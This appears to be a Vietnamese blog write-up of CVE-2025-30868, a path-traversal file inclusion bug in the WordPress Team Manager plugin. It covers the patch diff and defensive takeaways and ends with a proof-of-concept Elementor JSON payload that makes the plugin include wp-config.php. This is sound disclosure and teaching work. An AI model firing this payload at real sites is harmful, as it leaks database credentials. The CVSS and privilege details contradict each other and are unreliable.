---
title: CVE-2025-30868 Analysis & POC
description: Security Vulnerability in WordPress Team Manager Plugin.
date: 2025-10-15 19:00:00 +0700
categories: [CVE Analyst]
tags: [analyst, plugin, lfi]
images: ["app.png"]
featuredImage: "app.png"

lightgallery: true

toc:
  auto: false
---

<!--more-->

## CVE & Basic Info
Plugin **Team Manager** phiên bản **≤ 2.1.23** chứa lỗ hổng **Local File Inclusion** cho phép kẻ tấn công không cần xác thực điều khiển tham số file trong lệnh `include/require`, từ đó chèn hoặc đọc các tệp cục bộ trên máy chủ (ví dụ file cấu hình chứa credential), dẫn tới rò rỉ thông tin nhạy cảm và trong một số cấu hình có thể dẫn tới thực thi mã.

* **CVE ID**: [CVE-2025-30868](https://www.cve.org/CVERecord?id=CVE-2025-30868)
* **Vulnerability Type**: Local File Inclusion
* **Affected Versions**: <= 2.1.23
* **Patched Versions**: 2.2.0
* **CVSS severity**: Low (7.5)
* **Required Privilege**: Contributor
* **Product**: [WordPress Team Manager Plugin](https://wordpress.org/plugins/wp-team-manager/)

## Requirements
* **Local WordPress & Debugging**: [Local WordPress and Debugging](https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/).
* **Plugin versions** - **Team Manager**: **2.1.23** (vulnerable) và **2.2.0** (patched).
* **Diff tool** - [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.
* [**Elementor plugin**](https://wordpress.org/plugins/elementor/)

## Analysis

### Patch diff

**Bản lỗi**:

```php {filename="Helper.php v2.1.23" hl_lines=[14]}
public static function renderElementorLayout(string $layout, array $data, array $settings): void
{
    $styleTypeKey = "{$layout}_style_type";
    $styleType = stripslashes($settings[$styleTypeKey]);
    $path = stripslashes(TM_PATH . '/public/templates/elementor/layouts/' . $layout . '/');
    $templateName = sanitize_file_name( $styleType . '.php' );
    //allowed file type
    $allowedFileTypes = [
        'php'
    ];
    $ext = pathinfo($path . $templateName, PATHINFO_EXTENSION);
    if (in_array($ext, $allowedFileTypes)) {
        if (file_exists($path . $templateName)) {
            include self::locateTemplate($templateName, '', $path);
        }
    }

}

private static function locateTemplate(string $templateName, string $templatePath = '', string $defaultPath = ''): string
{
    $templatePath = $templatePath ?: 'public/templates';
    $defaultPath = $defaultPath ?: TM_PATH . '/public/templates/';
    $template = locate_template(trailingslashit($templatePath) . $templateName);
    return $template ?: "{$defaultPath}{$templateName}";
}
```

Trong phiên bản lỗi, hàm `renderElementorLayout()` không xác thực giá trị đầu vào. **attacker** có thể vượt qua logic trên khi kiểm soát được `$layout` và `$settings`, ví dụ:

**Trong hàm `renderElementorLayout()`**:

* `$layout = "../../../../../../.."`
* `$settings['../../../../../../.._style_type'] = "wp-config"`

Khi đó:

* `$styleType = 'wp-config'`
* `$path = TM_PATH . '/public/templates/elementor/layouts/../../../../../../../'`
* `$templateName=wp-config.php` 
* `$path . $templateName = TM_PATH . '/public/templates/elementor/layouts/../../../../../../../wp-config.php`

{{< figure src="debug1.png" caption="Debugger giá trị của các biến" >}}

Sau khi vượt qua các mệnh đề `if` thì `include` giá trị trả về của `locateTemplate(wp-config.php, '', TM_PATH . '/public/templates/elementor/layouts/../../../../../../../')` :

```php {filename="Helper.php v2.1.23" hl_lines=[6]}
private static function locateTemplate(string $templateName, string $templatePath = '', string $defaultPath = ''): string
{
    $templatePath = $templatePath ?: 'public/templates';
    $defaultPath = $defaultPath ?: TM_PATH . '/public/templates/';
    $template = locate_template(trailingslashit($templatePath) . $templateName);
    return $template ?: "{$defaultPath}{$templateName}";
}
```

Khi đó:

* `$templatePath = public/templates`
* `$defaultPath = TM_PATH . '/public/templates/elementor/layouts/../../../../../../../'`
* `$locate_template = locate_template('public/templates/wp-config.php') = ""` - [locate_template()](https://developer.wordpress.org/reference/functions/locate_template/) sẽ trả về đường dẫn tuyệt đối của file nếu tìm thấy, ngược lại trả về chuỗi rỗng `""`.
* Khi `$locate_template` rỗng thì trả về  `TM_PATH . '/public/templates/elementor/layouts/../../../../../../../wp-config.php'` để `include`.

**Bản vá**:

```php {filename="Helper.php v2.2.0" hl_lines = [3, 5, 13, 18, 23, 26, 29, 40, 46, 58, 70, 74, 85]}
public static function renderElementorLayout(string $layout, array $data, array $settings): void
{
    $allowedLayouts = ['grid', 'list', 'slider', 'table', 'isotope']; // Allowed layouts

    if (!in_array($layout, $allowedLayouts, true)) {
        wp_die(__('Invalid layout.', 'wp-team-manager'));
    }

    $styleTypeKey = "{$layout}_style_type";
    $styleType = $settings[$styleTypeKey] ?? '';

    // Ensure only safe characters (alphanumeric + underscores)
    if (!preg_match('/^[a-zA-Z0-9_-]+$/', $styleType)) {
        wp_die(__('Invalid style type.', 'wp-team-manager'));
    }

    // Ensure constants exist before using them
    if (!defined('TM_PATH')) {
        wp_die(__('TM_PATH is not defined.', 'wp-team-manager'));
    }

    // Define Free path (always available)
    $basePath = realpath(TM_PATH . '/public/templates/elementor/layouts/');

    // Define Pro path if available
    $proPath = defined('TM_PRO_PATH') ? realpath(TM_PRO_PATH . '/public/templates/elementor/layouts/') : null;

    // Ensure the free path is valid
    if (!$basePath) {
        wp_die(__('Invalid base template path.', 'wp-team-manager'));
    }

    $templateName = sanitize_file_name($styleType . '.php');

    // Define possible template paths (Pro first, then Free)
    $proFullPath = $proPath ? $proPath . '/' . $layout . '/' . $templateName : null;
    $freeFullPath = $basePath . '/' . $layout . '/' . $templateName;

    // Check if Pro template exists and is readable
    if ($proFullPath && is_readable($proFullPath) && strpos(realpath($proFullPath), $proPath) === 0) {
        include $proFullPath;
        return;
    }

    // Check if Free template exists and is readable
    if (is_readable($freeFullPath) && strpos(realpath($freeFullPath), $basePath) === 0) {
        include $freeFullPath;
        return;
    }

    // If neither file is found, show an error
    wp_die(__('Template not found or invalid file.', 'wp-team-manager'));
}

private static function locateTemplate(string $templateName, string $templatePath = '', string $defaultPath = ''): string
{
    // Ensure template name is safe (allow only alphanumeric, dashes, and underscores)
    if (!preg_match('/^[a-zA-Z0-9_-]+\.php$/', $templateName)) {
        die('Invalid template name.');
    }

    $templatePath = $templatePath ?: 'public/templates';
    $defaultPath = $defaultPath ?: TM_PATH . '/public/templates/';

    // Ensure paths are properly resolved
    $resolvedDefaultPath = realpath($defaultPath);
    $resolvedTemplatePath = realpath(trailingslashit($templatePath));

    // Validate resolved paths
    if (!$resolvedDefaultPath || strpos($resolvedDefaultPath, realpath(TM_PATH . '/public/templates/')) !== 0) {
        die('Invalid default path.');
    }

    if ($resolvedTemplatePath && strpos($resolvedTemplatePath, realpath(TM_PATH . '/public/templates/')) === 0) {
        $template = locate_template($resolvedTemplatePath . '/' . $templateName);
        if ($template && file_exists($template)) {
            return $template;
        }
    }

    // Build the final safe path
    $finalPath = $resolvedDefaultPath . '/' . $templateName;

    // Ensure the final path is within the allowed directory
    if (file_exists($finalPath) && strpos(realpath($finalPath), $resolvedDefaultPath) === 0) {
        return $finalPath;
    }

    die('Template not found or invalid.');
}
```

Bản vá đã áp dụng xác thực đầu vào nghiêm ngặt, kiểm tra đường dẫn tuyệt đối, và hạn chế layout hợp lệ, giúp loại bỏ hoàn toàn khả năng khai thác file ngoài phạm vi cho phép => ngăn **Local File Inclusion (LFI)**

### Vulnerable Code 

> [!INFO]
> Chữ **Elementor** trong tên hàm `renderElementorLayout()` liên quan đến plugin [**Elementor plugin**](https://wordpress.org/plugins/elementor/) trong WordPress, dùng để tạo nội dung cho **post**.

Khi gửi request chỉnh sửa post chứa **widgets Team Manager** này hoặc mở post sau khi lưu thì `renderElementorLayout()` sẽ được gọi.

{{< figure src="plugin_element.png" caption="Plugin element trong Elementor" >}}

Bắt request chỉnh sửa bằng BurpSuite:

{{< figure src="setting.png" caption="Key settings trong request" >}}

Quan sát ta thấy có key `settings` chứa các key `layout_type` và `{layout_type_value}_stype_type` tương ứng với code ta phân tích ở trên:

```php
$styleTypeKey = "{$layout}_style_type";
$styleType = stripslashes($settings[$styleTypeKey]);
```

👉 Ta có thể kiểm soát các giá trị ở đây.

## Exploit
### Proof of Concept (PoC)

#### Step 1

Tạo team mới tại endpoint: `wp-admin/post-new.php?post_type=team_manager` vì khi có team thì mới có giá trị để thêm vào layout của **widget Team Manager**.

#### Step 2

Tạo post bằng **Elementor**, thêm **widgets Team Manager**.

{{< figure src="widgets.png" caption="Thêm Team Manager widget vào post" >}}


#### Step 3

**Submit**, bắt request bằng **BurpSuite** gửi đến **Repeater**

#### Step 4

Bôi đen giá trị của param `action`,sửa payload tại **tab Inspector** và gửi lại request

```json
{
  "save_builder": {
    "action": "save_builder",
    "data": {
      "status": "pending",
      "elements": [
        {
          "id": "e9249f1",
          "elType": "container",
          "isInner": false,
          "isLocked": false,
          "settings": {},
          "elements": [
            {
              "id": "3e7c95b",
              "elType": "widget",
              "isInner": false,
              "isLocked": false,
              "settings": {
                "layout_type": "../../../../../../..",
                "../../../../../../.._style_type": "wp-config"
              },
              "elements": [],
              "widgetType": "wtm-team-manager"
            }
          ]
        },
        {
          "id": "b132b28",
          "elType": "container",
          "isInner": false,
          "isLocked": false,
          "settings": {},
          "elements": []
        }
      ],
      "settings": {
        "post_title": "Team",
        "post_status": "pending"
      }
    }
  }
}
```

**Result**:

Debugger đã nhảy đến `wp-config.php`

{{< figure src="result.png" caption="Kết quả LFI thành công" >}}

## Conclusion

CVE-2025-30868 là LFI trong Team Manager ≤2.1.23: `renderElementorLayout()` không xác thực `$layout`/`$settings`, cho phép path traversal và `include()` file ngoài ý muốn. Đã vá trong **v2.2.0** bằng whitelist, regex và kiểm tra `realpath()`.

## Key takeaways

* Không dùng input thô để build `include`.
* Dùng **whitelist** cho layout/template.
* Sanitize tên file + `realpath()` + `is_readable()` trước khi include.
* Với endpoint public: kiểm soát input server-side, nonce không đủ.

## References

[File Inclusion/Path traversal — Hacktrick](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=lfi#lfi--rfi-using-php-wrappers--protocols)

[ WordPress Team Manager Plugin <= 2.1.23 is vulnerable to Local File Inclusion ](https://patchstack.com/database/wordpress/plugin/wp-team-manager/vulnerability/wordpress-team-manager-plugin-2-1-23-local-file-inclusion-vulnerability)